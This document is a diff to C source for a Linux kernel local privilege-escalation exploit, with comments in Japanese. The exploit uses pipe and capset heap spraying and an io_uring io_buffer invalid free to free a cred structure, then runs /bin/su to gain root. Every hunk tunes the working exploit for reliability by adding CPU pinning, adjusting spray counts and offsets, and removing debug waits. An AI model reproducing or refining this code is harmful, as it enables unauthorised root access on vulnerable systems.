@@ -31,7 +31,7 @@
 #define PAGE 0x1000UL
 
 #define NUM_IOBUF \
-  0x100  // UNIMPLEMENTED:
+  0x23D  // UNIMPLEMENTED:
          // 微調整して最後のio_bufferがページの最後の方に来るように
 char iobufs[PAGE][NUM_IOBUF] = {0};
 
@@ -45,6 +45,8 @@ struct state {
   int cred_spray_num;
   // credがInvalid Freeされたかどうか
   int cred_uafed;
+  // credが特権に置き換わったかどうか
+  int pwned;
 };
 
 struct state *state;
@@ -191,12 +193,13 @@ void *setcap_worker(void *arg) {
    */
   pthread_mutex_lock(&lock);
   {
+    pinning_thread(0);
     if (capset(&cap_header, &cap_data) < 0) errExit("capset");
     ++state->cred_spray_num;
   }
   pthread_mutex_unlock(&lock);
 
-  sleep(500);  // EOL
+  sleep(9999);  // EOL
   return NULL;
 }
 
@@ -211,6 +214,7 @@ void *su_worker(void *arg) {
     usleep(1000);
   }
 
+  pinning_thread(0);
   system("/bin/su");
 
   sleep(99999);
@@ -235,7 +239,7 @@ int main(void) {
 /**
  * capsetをしてくれるスレッドを用意する。
  */
-#define CAPSET_THREAD_NUM 0x80
+#define CAPSET_THREAD_NUM 0x50
   puts("[+] Creating capset threads...");
   pthread_t setcap_pids[CAPSET_THREAD_NUM];
   for (int ix = 0; ix < CAPSET_THREAD_NUM; ix++) {
@@ -245,7 +249,7 @@ int main(void) {
   /**
    * TODO
    */
-#define SU_THREAD_NUM 0x10
+#define SU_THREAD_NUM 0x5
   puts("[+] Creating su threads...");
   pthread_t su_pids[SU_THREAD_NUM];
   for (int ix = 0; ix < SU_THREAD_NUM; ix++) {
@@ -256,16 +260,18 @@ int main(void) {
    * スレッドが作成されるまで少し待つ
    */
   usleep(1000);
+  pinning_thread(0);
 
   /**
    * 大量のパイプを用意する
    */
-#define SPRAY_PIPE_NUM 0x80
+#define SPRAY_PIPE_NUM 0x60
   puts("[+] Creating pipe buffers...");
   int pipefds[SPRAY_PIPE_NUM][2];
   for (int ix = 0; ix != SPRAY_PIPE_NUM; ++ix) {
     if (pipe(pipefds[ix]) < 0) errExit("pipe");
   }
+  usleep(5000);
 
   /**
    * pipeに書き込むことでページを確保する。
@@ -282,6 +288,7 @@ int main(void) {
    * NOTE: ここで連続するページを解放してしまうと、
    * 　Buddy AllocatorがページをマージしてOrder-1以上に持っていってしまう。
    */
+  pinning_thread(0);
   puts("[+] Closing even pages...");
   for (int ix = 0; ix < SPRAY_PIPE_NUM; ix += 2) {
     close(pipefds[ix][0]);
@@ -300,6 +307,7 @@ int main(void) {
   while (state->cred_spray_num < CAPSET_THREAD_NUM) {
     usleep(1000);
   }
+  pinning_thread(0);
 
   /**
    * 奇数番目のpipeを閉じてBuddy(Order-0)に返却する。
@@ -323,10 +331,8 @@ int main(void) {
   /**
    * io_bufferのinvalid freeを使って次のページにあるcredをfreeする。
    */
-  puts("[+] Invoking invalid free of cred...!");
-  WAIT();
   const ulong cred_offset =
-      0x180;  // HEURISTIC: 最後のio_bufferと次のページまでのオフセット
+      0x140;  // HEURISTIC: 最後のio_bufferと次のページまでのオフセット
   ring_submit_read(&ring, fd, cred_offset, 0, 0);
   assert(ring_wait_cqe(&ring) == cred_offset);
 
@@ -334,9 +340,6 @@ int main(void) {
    * `/bin/su`を実行するように合図する
    */
   state->cred_uafed = 1;
-
-  usleep(100);
-  WAIT();
 
   sleep(9999);  // unreachable
 
